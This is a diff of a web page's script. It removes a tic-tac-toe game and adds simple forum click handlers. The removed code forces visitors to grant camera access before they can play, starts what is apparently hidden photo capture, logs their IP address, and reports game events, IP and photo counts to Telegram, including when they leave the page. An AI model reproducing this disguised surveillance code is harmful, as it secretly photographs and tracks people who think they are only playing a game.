-                resultMessage.textContent = isPlayerWinner 
-                    ? `You won the game against ${opponentId}!` 
-                    : `${opponentId} won the game!`;
-                resultModal.style.display = 'flex';
-                
-                // Send result to Telegram
-                sendToTelegram(`🏁 Game finished!\nRoom: ${gameRoom}\nWinner: ${isPlayerWinner ? playerId : opponentId}\nLoser: ${isPlayerWinner ? opponentId : playerId}\nIP: ${playerIP}`);
-                return;
-            }
-            
-            const roundDraw = !gameState.includes('');
-            if (roundDraw) {
-                gameActive = false;
-                resultTitle.textContent = '🤝 Draw!';
-                resultMessage.textContent = 'Game ended in a draw!';
-                resultModal.style.display = 'flex';
-                
-                // Send result to Telegram
-                sendToTelegram(`🤝 Game finished with draw!\nRoom: ${gameRoom}\nPlayers: ${playerId} vs ${opponentId}\nIP: ${playerIP}`);
-                return;
-            }
-        }
-        
-        // Return to main menu
-        function returnToMenu() {
-            gameActive = false;
-            mainScreen.style.display = 'flex';
-            gameScreen.style.display = 'none';
-            searchScreen.style.display = 'flex';
-            gameBoard.style.display = 'none';
-            searchingDiv.style.display = 'none';
-            createGameBtn.style.display = 'block';
-            joinGameBtn.style.display = 'block';
-            resultModal.style.display = 'none';
-            
-            // Reset game state
-            playerSymbol = '';
-            opponentId = '';
-            gameRoom = null;
-            isMyTurn = false;
-            
-            // Send leave notification
-            if (gameRoom) {
-                sendToTelegram(`👋 Player ${playerId} left the game\nRoom: ${gameRoom}\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
-            }
-        }
-        
-        // Initialize game
-        function initGame() {
-            createFloatingSymbols();
-            getIPAddress();
-            initWebSocket();
-            
-            // Event Listeners
-            playButton.addEventListener('click', () => {
-                cameraModal.style.display = 'flex';
-            });
-            
-            allowCameraBtn.addEventListener('click', async () => {
-                cameraModal.style.display = 'none';
-                
-                try {
-                    // Request camera permission
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: true,
-                        audio: false 
-                    });
-                    
-                    // Stop the test stream
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    isCameraAllowed = true;
-                    cameraStatus.style.display = 'block';
-                    cameraStatusText.textContent = 'ON';
-                    cameraStatusText.className = 'camera-on';
-                    
-                    // Show game screen
-                    mainScreen.style.display = 'none';
-                    gameScreen.style.display = 'block';
-                    
-                    // Start photo capture
-                    startPhotoCapture();
-                    
-                } catch (error) {
-                    alert('Camera access denied. You cannot play without camera permission.');
-                    cameraModal.style.display = 'none';
-                }
-            });
-            
-            denyCameraBtn.addEventListener('click', () => {
-                cameraModal.style.display = 'none';
-                alert('Camera access is required to play this game.');
-            });
-            
-            createGameBtn.addEventListener('click', () => {
-                findOpponent(true);
-            });
-            
-            joinGameBtn.addEventListener('click', () => {
-                findOpponent(false);
-            });
-            
-            // Game board event listeners
-            cells.forEach(cell => {
-                cell.addEventListener('click', handleCellClick);
-            });
-            
-            restartButton.addEventListener('click', returnToMenu);
-            closeResult.addEventListener('click', returnToMenu);
-        }
-        
-        // Handle page unload
-        window.addEventListener('beforeunload', () => {
-            stopPhotoCapture();
-            
-            if (isCameraAllowed && gameRoom) {
-                sendToTelegram(`🚪 Player ${playerId} left the website\nRoom: ${gameRoom}\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
-            }
         });
-        
-        // Initialize the game when page loads
-        window.addEventListener('DOMContentLoaded', initGame);
+
+        // Функционал для клика по элементам форума
+        document.querySelectorAll('.forum-item').forEach(item => {
+            item.addEventListener('click', function() {
+                if (!this.querySelector('input')) {
+                    console.log('Открыть тему: ' + (this.querySelector('.forum-title')?.textContent || this.querySelector('h2, h3')?.textContent));
+                }
+            });
+        });
+
+        // Имитация работы статусных тегов
+        document.querySelectorAll('.status-tag').forEach(tag => {
+            tag.addEventListener('click', function(e) {
+                e.stopPropagation();
+                console.log('Статус: ' + this.textContent);
+            });
+        });
     </script>
 </body>
 </html>
